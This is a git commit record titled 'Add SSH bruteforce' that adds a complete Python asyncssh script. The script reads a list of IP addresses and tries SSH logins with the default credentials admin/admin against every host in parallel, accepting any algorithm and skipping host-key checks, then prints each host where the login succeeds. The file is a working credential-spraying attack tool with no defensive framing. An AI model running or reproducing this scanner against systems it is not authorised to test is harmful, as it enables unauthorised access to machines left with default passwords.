e5a5e9573944ef8095d4d71518c94c3221d7dd02
Timothée Cocault <timothee.cocault@gmail.com>
2023-10-12 20:41:53 +0200

    Add SSH bruteforce

---
+++ brutasse/ssh/brute.py
@@ -0,0 +1,58 @@
+#!/usr/bin/env python3
+
+import asyncio
+import argparse
+import asyncssh
+from typing import TextIO
+from termcolor import colored
+from ..utils import ConnectionFailed
+from ..parallel import progressbar_execute
+
+
+def get_ips(file: TextIO) -> set[str]:
+    return {l.strip() for l in file}
+
+
+async def ssh_brute(ip: str):
+    opt1 = {
+        'known_hosts': None,
+        'preferred_auth': ['keyboard-interactive', 'password'],
+        'kex_algs': '*',
+        'encryption_algs': '*',
+        'mac_algs': '*',
+    }
+    opt2 = {
+        'host': ip,
+        'port': 22,
+        'username': 'admin',
+        'password': 'admin',
+        'connect_timeout': 2,
+        'login_timeout': 10,
+    }
+    async with asyncssh.connect(**(opt1 | opt2)):
+        return f'{ip}'
+
+
+async def main() -> None:
+    parser = argparse.ArgumentParser()
+    parser.add_argument('infile', type=argparse.FileType('r'))
+    args = parser.parse_args()
+    coros = [ssh_brute(ip) for ip in get_ips(args.infile)]
+    async for fut in progressbar_execute(coros, 100):
+        try:
+            res = fut.result()
+            print(res)
+        except ConnectionFailed:
+            pass
+        except ConnectionResetError:
+            pass
+        except asyncssh.PermissionDenied:
+            pass
+        except asyncssh.ConnectionLost:
+            pass
+        except TimeoutError:
+            pass
+        except Exception as e:
+            print(colored(repr(e), 'red'))
+
+asyncio.run(main())
